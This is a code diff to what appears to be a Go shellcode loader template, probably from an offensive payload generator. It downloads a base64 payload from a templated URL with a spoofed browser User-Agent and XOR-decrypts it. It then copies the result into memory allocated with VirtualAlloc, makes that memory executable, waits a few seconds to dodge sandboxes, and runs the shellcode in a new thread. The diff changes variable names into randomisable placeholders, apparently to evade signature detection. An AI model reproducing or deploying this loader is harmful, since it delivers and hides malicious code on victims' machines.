@@ -13,13 +13,6 @@ import (
   "time"
 )
 
-const (
-        MEM_COMMIT = 0x1000
-        MEM_RESERVE = 0x2000
-        PAGE_EXECUTE_READ = 0x20
-        PAGE_READWRITE = 0x04
-)
-
 func HTTPDownload(download_src string) string {
 	req, _ := http.NewRequest("GET", download_src, nil)
         req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36")
@@ -60,21 +53,54 @@ func DecryptXOR(ciphertext, key []byte) []byte {
 	return plaintext
 }
 
+func ExecuteWaitForSingleObject(plaintext []byte, debug bool) {
+	{{PAGE_READWRITE}} := 0x04
+
+	// load dlls
+    {{KERNEL_32}} := syscall.NewLazyDLL("kernel32.dll")
+    {{NTDLL}} := syscall.NewLazyDLL("ntdll.dll")
+
+	// shellcode prep
+	{{VIRTUAL_ALLOC}} := {{KERNEL_32}}.NewProc("VirtualAlloc")
+	{{VIRTUAL_PROTECT}} := {{KERNEL_32}}.NewProc("VirtualProtect")
+	{{RTL_COPY_MEMORY}} := {{NTDLL}}.NewProc("RtlCopyMemory")
+	{{CREATE_THREAD}} := {{KERNEL_32}}.NewProc("CreateThread")
+	{{WAIT_FOR_SINGLE_OBJECT}} := {{KERNEL_32}}.NewProc("WaitForSingleObject")
+
+	{{TMP_ADDRESS}}, _, _ := {{VIRTUAL_ALLOC}}.Call(uintptr(0), uintptr(len(plaintext)), 0x1000|0x2000, 0x04)
+
+	{{RTL_COPY_MEMORY}}.Call({{TMP_ADDRESS}}, (uintptr)(unsafe.Pointer(&plaintext[0])), uintptr(len(plaintext)))
+
+	{{TMP_PROTECT}} := {{PAGE_READWRITE}}
+	{{VIRTUAL_PROTECT}}.Call({{TMP_ADDRESS}}, uintptr(len(plaintext)), 0x20, uintptr(unsafe.Pointer(&{{TMP_PROTECT}})))
+
+	if debug {
+		fmt.Println("[+] Sleeping...")
+		time.Sleep(30 * time.Second)
+	} else {
+		time.Sleep(5 * time.Second)
+	}
+
+	// shellcode exec
+	{{THREAD}}, _, _ := {{CREATE_THREAD}}.Call(0, 0, {{TMP_ADDRESS}}, uintptr(0), 0, 0)
+	{{WAIT_FOR_SINGLE_OBJECT}}.Call({{THREAD}}, 0xFFFFFFFF)
+}
+
 func main() {
 	// template variables
-	download_src := {{DOWNLOAD_SRC}}
+	download_src := "{{DOWNLOAD_SRC}}"
 	debug := {{DEBUG}}
-	crypter_mode := {{CRYPTER_MODE}}
-	execution_mode := {{EXECUTION_MODE}}
-	download_mode := {{DOWNLOAD_MODE}}
-        key := {{KEY}}
-        randomizer := {{RANDOMIZER}}
+	crypter_mode := "{{CRYPTER_MODE}}"
+	execution_mode := "{{EXECUTION_MODE}}"
+	download_mode := "{{DOWNLOAD_MODE}}"
+    key := "{{KEY}}"
+    randomizer := "{{RANDOMIZER}}"
 
 	ciphertext_b64 := ""
 	var plaintext []byte
 
 	if debug {
-        	fmt.Println("[+] Randomizer: ", randomizer)
+        fmt.Println("[+] Randomizer: ", randomizer)
 		fmt.Println("[+] Key: ", key)
 		fmt.Println("[+] Execution mode: ", execution_mode)
 	}
@@ -91,7 +117,7 @@ func main() {
 	}
 
 	// base64 decode payload, now we have the ciphertext in byte array format
-        ciphertext, _ := base64.StdEncoding.DecodeString(string(ciphertext_b64))
+    ciphertext, _ := base64.StdEncoding.DecodeString(string(ciphertext_b64))
   
 	// decrypt ciphertext, still in byte array format, this is the shellcode
 	if crypter_mode == "xor" {
@@ -102,32 +128,5 @@ func main() {
 		plaintext = ciphertext
 	}
 
-	// load dlls
-        kernel32 := syscall.NewLazyDLL("kernel32.dll")
-        ntdll := syscall.NewLazyDLL("ntdll.dll")
-
-	// shellcode prep
-        VirtualAlloc := kernel32.NewProc("VirtualAlloc")
-        VirtualProtect := kernel32.NewProc("VirtualProtect")
-        RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
-        CreateThread := kernel32.NewProc("CreateThread")
-        WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
-
-        addr, _, _ := VirtualAlloc.Call(uintptr(0), uintptr(len(plaintext)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-
-        RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&plaintext[0])), uintptr(len(plaintext)))
-
-        oldProtect := PAGE_READWRITE
-        VirtualProtect.Call(addr, uintptr(len(plaintext)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
-
-	if debug {
-		fmt.Println("[+] Sleeping...")
-		time.Sleep(30 * time.Second)
-	} else {
-		time.Sleep(5 * time.Second)
-	}
-
-	// shellcode exec
-        thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
-        WaitForSingleObject.Call(thread, 0xFFFFFFFF)
+	ExecuteWaitForSingleObject(plaintext, debug)
 }
